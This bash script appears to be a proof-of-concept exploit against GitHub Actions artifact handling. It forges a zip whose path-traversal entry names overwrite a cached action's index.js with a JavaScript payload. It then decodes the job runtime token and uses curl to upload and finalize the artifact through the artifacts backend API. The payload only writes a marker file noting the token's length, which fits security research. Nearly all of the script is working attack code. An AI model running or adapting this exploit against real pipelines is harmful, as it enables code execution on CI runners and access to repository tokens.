#!/usr/bin/env bash
# Forge an artifact zip with path-traversal entry names and upload it directly
# to the Actions artifacts backend using the job runtime token.
set -euo pipefail

zipdir="$RUNNER_TEMP/zipslip2"
rm -rf "$zipdir"
mkdir -p "$zipdir"

cat > "$zipdir/payload.js" <<'JS'
try {
  const fs = require('node:fs')
  const token = process.env['INPUT_GITHUB-TOKEN'] || process.env.GITHUB_TOKEN || 'none'
  fs.writeFileSync(
    '/home/runner/work/HIJACK_MARKER.txt',
    'HIJACKED-ACTION-EXECUTED token_len=' + String(token).length + '\n'
  )
  console.log('HIJACKED-ACTION-RAN')
} catch (e) {
  console.log('payload-error ' + e)
}
JS

python3 - "$zipdir" <<'PY'
import os, sys, zipfile
d = sys.argv[1]
payload = open(os.path.join(d, 'payload.js'), 'rb').read()
out = os.path.join(d, 'a.zip')
z = zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED)
z.writestr('inside.txt', 'inside\n')
z.writestr('../UP1.txt', 'up1\n')
z.writestr('../../UP2.txt', 'up2\n')
z.writestr('sub/../../../UP3.txt', 'up3\n')
z.writestr('../../_actions/actions/github-script/v9/dist/index.js', payload)
z.close()
print('zip entries:', zipfile.ZipFile(out).namelist())
PY

python3 - <<'PY' > "$zipdir/ids.json"
import os, base64, json
t = os.environ['ACTIONS_RUNTIME_TOKEN'].split('.')[1]
t += '=' * (-len(t) % 4)
c = json.loads(base64.urlsafe_b64decode(t))
scp = [s for s in c['scp'].split(' ') if s.startswith('Actions.Results:')][0]
_, wr, jr = scp.split(':')
print(json.dumps({'wr': wr, 'jr': jr, 'results': os.environ['ACTIONS_RESULTS_URL']}))
PY

WR=$(jq -r .wr "$zipdir/ids.json")
JR=$(jq -r .jr "$zipdir/ids.json")
ORIGIN=$(python3 -c "import json,urllib.parse;u=urllib.parse.urlparse(json.load(open('$zipdir/ids.json'))['results']);print(f'{u.scheme}://{u.netloc}')")
SIZE=$(stat -c%s "$zipdir/a.zip")
HASH=$(sha256sum "$zipdir/a.zip" | cut -d' ' -f1)

echo "origin=$ORIGIN wr=$WR jr=$JR size=$SIZE"

CREATE=$(curl -sS -X POST "$ORIGIN/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
  -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"workflow_run_backend_id\":\"$WR\",\"workflow_job_run_backend_id\":\"$JR\",\"name\":\"slip2-art\",\"mime_type\":{\"value\":\"application/zip\"},\"version\":7}")
echo "create: $CREATE"
URL=$(echo "$CREATE" | jq -r .signed_upload_url)
[ "$URL" != "null" ] || { echo "no signed url"; exit 1; }

echo "put status: $(curl -sS -o /dev/null -w '%{http_code}' -X PUT "$URL" \
  -H "x-ms-blob-type: BlockBlob" \
  -H "Content-Type: application/zip" \
  --data-binary "@$zipdir/a.zip")"

FINAL=$(curl -sS -X POST "$ORIGIN/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
  -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"workflow_run_backend_id\":\"$WR\",\"workflow_job_run_backend_id\":\"$JR\",\"name\":\"slip2-art\",\"size\":\"$SIZE\",\"hash\":{\"value\":\"sha256:$HASH\"}}")
echo "finalize: $FINAL"
